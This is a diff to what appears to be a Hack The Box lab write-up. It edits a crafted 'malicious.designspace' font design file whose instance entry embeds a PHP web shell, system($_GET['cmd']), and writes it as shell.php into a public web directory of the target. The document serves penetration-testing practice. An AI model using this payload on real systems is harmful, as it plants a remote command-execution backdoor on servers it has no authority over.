@@ -291,12 +291,17 @@ ajdev@rootbox:~/HTB$ cat > malicious.designspace << 'EOF'
 <?xml version='1.0' encoding='UTF-8'?>
 <designspace format="4.1">
   <axes>
-    <axis tag="wght" name="Weight" minimum="100" default="400" maximum="900"/>
+    <axis tag="wght" name="Weight" minimum="100" default="100" maximum="900"/>
   </axes>
   <sources>
-    <source filename="dummy.ttf" familyname="Test" stylename="Regular">
+    <source filename="light.ttf" familyname="Test" stylename="Light">
       <location>
-        <dimension name="Weight" xvalue="400"/>
+        <dimension name="Weight" xvalue="100"/>
+      </location>
+    </source>
+    <source filename="bold.ttf" familyname="Test" stylename="Bold">
+      <location>
+        <dimension name="Weight" xvalue="900"/>
       </location>
     </source>
   </sources>
@@ -306,8 +311,12 @@ ajdev@rootbox:~/HTB$ cat > malicious.designspace << 'EOF'
       familyname="<?php system($_GET['cmd']); ?>"
       filename="/var/www/portal.variatype.htb/public/files/shell.php"
       postscriptfontname="Test-Regular">
+      <location>
+        <dimension name="Weight" xvalue="100"/>
+      </location>
     </instance>
   </instances>
 </designspace>
 EOF
 ```
+
